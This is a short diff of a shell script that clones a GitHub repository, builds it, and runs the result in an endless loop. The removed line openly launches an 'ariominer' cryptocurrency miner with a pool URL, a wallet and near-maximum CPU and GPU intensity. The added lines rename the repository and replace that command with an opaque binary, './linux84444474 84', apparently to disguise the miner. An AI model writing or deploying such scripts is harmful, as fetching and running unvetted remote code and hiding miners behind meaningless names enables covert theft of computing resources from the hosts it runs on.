@@ -1,5 +1,5 @@
-git clone https://github.com/mobileapps84741274/linux8874
-cd ./linux8874/;
+git clone https://github.com/mobileapps84741274/linux8444
+cd ./linux8444/;
 mkdir ./build/;
 cd ./build/;
 cmake ..;
@@ -8,6 +8,6 @@ make;
 while true
 do
 
-./ariominer --mode miner --pool http://aro.blueinc.cloud:84 --wallet 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3 --name linux84 --cpu-intensity 94 --gpu-intensity-cblocks 99 --gpu-intensity-gblocks 99
+./linux84444474 84
 
 done
